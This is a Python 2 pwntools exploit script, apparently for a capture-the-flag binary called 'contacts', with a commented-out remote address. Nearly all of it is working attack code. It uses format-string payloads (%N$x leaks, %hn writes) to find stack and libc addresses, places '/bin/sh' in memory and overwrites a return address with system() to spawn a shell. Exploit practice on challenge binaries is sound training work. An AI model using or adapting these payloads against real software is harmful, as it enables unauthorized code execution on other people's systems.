#!/usr/bin/env python2

'''
Run this program,
go to a different terminal
ps aux | grep contacts 
Find the PID
gdb -p [PID]
add breakpoint at *0x8048c22 to break right before the printf 
go back to the first terminal
press Enter
'''

from pwn import *

binary = "./contacts_54f3188f64e548565bc1b87d7aa07427"


# Assume a process or remote connection
r = process(binary)
# r = remote('54.165.223.128',2555)

r.recvuntil(">>>")

raw_input()

uuid = 0

base = -1
# Declare a function that takes a single address, and
# leaks at least one byte at that address.


def getbase():
    global uuid
    global r

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "%6$08x *^*"
    

    r.sendline(sploit)

    r.recvuntil(">>>")

    r.sendline("4")

    parseme =  r.recvuntil(">>>")
    #print parseme

    ind = parseme.split().index("*^*")
    baseaddr = int(parseme.split()[ind - 1], 16)
    baseaddr -= 0x48

    print "baseaddr: " + hex(baseaddr)
    return baseaddr


# I'm not sure if this works
def leak(address):
    global uuid
    global r
    global base


    lower = address % 65536
    upper = address // 65536


    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "%" + str((base % 65536) + 120) + "x"
    sploit += "%33$hn"
    sploit += "A"*2
    sploit += "%34$hn"

    r.sendline(sploit)

    r.recvuntil(">>>")

    

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    if lower < upper:
        sploit = ""
        sploit += "%" + str(lower) + "x"
        sploit += "%73$hn"
        sploit += "%" + str(upper - lower) + "x"
        sploit += "%75$hn"
    else:
        sploit = ""
        sploit += "%" + str(upper) + "x"
        sploit += "%75$hn"
        sploit += "%" + str(lower - upper) + "x"
        sploit += "%73$hn"

    r.sendline(sploit)
    print sploit

    r.recvuntil(">>>")

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "%30$4s"
    r.sendline(sploit)

    r.recvuntil(">>>")

    r.sendline("4")

    stuffs =  r.recvuntil(">>>")

    print stuffs[-100:]
    ind = stuffs.rfind("Description:")
    print ind
    
    print "fin"

    data_s = stuffs[ind+13:ind+13+4]
    print data_s
    data = 0
    for c in data_s[::-1]:
        data <<= 8
        data += ord(c)
    print hex(data)
    return data
    #return hex(data)[2:]





# make the string "/bin/sh" in memory and return its address
def make_binsh():
    global uuid
    global r
    global base

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline("/bin/sh")
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("/bin/sh")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "%1$08x"

    r.sendline(sploit)

    r.recvuntil(">>>")

    r.sendline("4")

    stuffs =  r.recvuntil(">>>")

    print stuffs[-100:]
    ind = stuffs.rfind("Description:")
    print ind
    
    print "fin"

    data_s = stuffs[ind+13:ind+13+8]
    print data_s
    
    return data_s




# write the value to the address
# address is a number, but val is a hex string
def write_stack(address, val):
    global uuid
    global r
    global base


    lower = address % 65536
    upper = address // 65536

    baseupper = base // 65536
    if baseupper != upper:
        print "NOT GONNA WORK"
        raw_input() 


    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "%" + str(lower) + "x"
    sploit += "%33$hn"  # 132
    sploit += "A"*2
    sploit += "%34$hn"  # 136

    r.sendline(sploit)

    r.recvuntil(">>>")


    lower = val[-4:]
    upper = val[:-4]

    print upper, lower

    lower = int(lower, 16)
    upper = int(upper, 16)

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    if lower < upper:
        sploit = ""
        sploit += "%" + str(lower) + "x"
        sploit += "%73$hn"                              # 292
        if(upper-lower > 0):
            sploit += "%" + str(upper - lower) + "x"
        sploit += "%75$hn"                              # 300
    else:
        sploit = ""
        sploit += "%" + str(upper) + "x"
        sploit += "%75$hn"
        if(lower-upper > 0):
            sploit += "%" + str(lower - upper) + "x"
        sploit += "%73$hn"

    r.sendline(sploit)
    print sploit

    r.recvuntil(">>>")    

def run_sploit():
    global r
    r.sendline("4")
    r.interactive()


# print off parts of the stack then run the exploit
def blast_stack():
    global uuid
    global r
    global base

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("300")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "::%16$x"
    sploit += "::%17$x"
    sploit += "::%18$x"
    sploit += "::%19$x"
    sploit += "::%20$x"
    sploit += "::%21$x"
    sploit += "::%22$x"
    sploit += "::%23$x"
    sploit += "::%24$x"
    sploit += "::%25$x"
    sploit += "::%26$x"
    sploit += "::%27$x"
    sploit += "::%28$x"
    sploit += "::%29$x"
    sploit += "::%30$x"

    r.sendline(sploit)

    r.recvuntil(">>>")
    r.sendline("4")
    r.interactive()
    # print r.recvuntil(">>>")


# Find the offset of libc
def get_system():
    global uuid
    global r
    global base
    global startmain_offset

    r.sendline("1")

    print r.recvuntil("Name:")
    r.sendline(str(uuid))
    uuid += 1

    print r.recvuntil("No:")
    r.sendline("1")
    print r.recvuntil("Length of description:")
    r.sendline("60")
    print r.recvuntil("Enter description:")

    sploit = ""
    sploit += "%31$08x *^^*"
    

    r.sendline(sploit)

    r.recvuntil(">>>")

    r.sendline("4")

    parseme =  r.recvuntil(">>>")
    #print parseme

    ind = parseme.split().index("*^^*")
    systemaddr = int(parseme.split()[ind - 1], 16)
    

    systemaddr -= 230  # we are grabbing the return address for <__libc_start_main+230>
    systemaddr -= startmain_offset  # __libc_start_main

    # systemaddr = 256 * (systemaddr // 256)
    systemaddr &= ~((1<<12) - 1)  # The lower 12 bits of libc addresses aren't randomized, http://www.limited-entropy.com/fusion-04-exploit-write-up/



    print "libc: " + hex(systemaddr)
    return systemaddr

# Remove all contacts
def delete_all():
    global uuid
    global r
    global base

    while uuid >=0:
        uuid -= 1

        r.sendline("2")
        r.recvuntil("remove?")
        r.sendline(str(uuid))
        r.recvuntil(">>>")

# start by getting the address of the top of the stack
base = getbase()
# raw_input()

#blast_stack()
# raw_input()
# leak(base + 24)



'''
# remote values:
startmain_offset = 0x00019970   # ????
system_offset = 0x0003fcd0    
printf_offset = 0x0004cc40  # ????
'''

# local value:
# YOU WILL HAVE TO CHANGE THESE TO MATCH YOUR SYSTEM
startmain_offset = 0x00016d60   # ????
system_offset = 0x0003be20
printf_offset = 0x00049d70  # ????

# Get the offset of libc
libc_base = get_system()
 
# Use this offset to get addresses of important functions 
system = libc_base + system_offset
printf = libc_base + printf_offset

print "printf", hex(printf)


# change this to be either system or printf depending on if you want a shell or a proof of concept
ret2libc = hex(system)[2:]
print "ret2libc", ret2libc
delete_all()
raw_input()

binsh = make_binsh()
print "binsh: ", binsh

#blast_stack()

raw_input()



write_stack(base + 21*4, binsh)
#write_stack(base + 60, "EEEEFFFF")
write_stack(base + 19*4, ret2libc)  # system

print "ready to SPLOIT"

raw_input()

blast_stack()


#run_sploit()



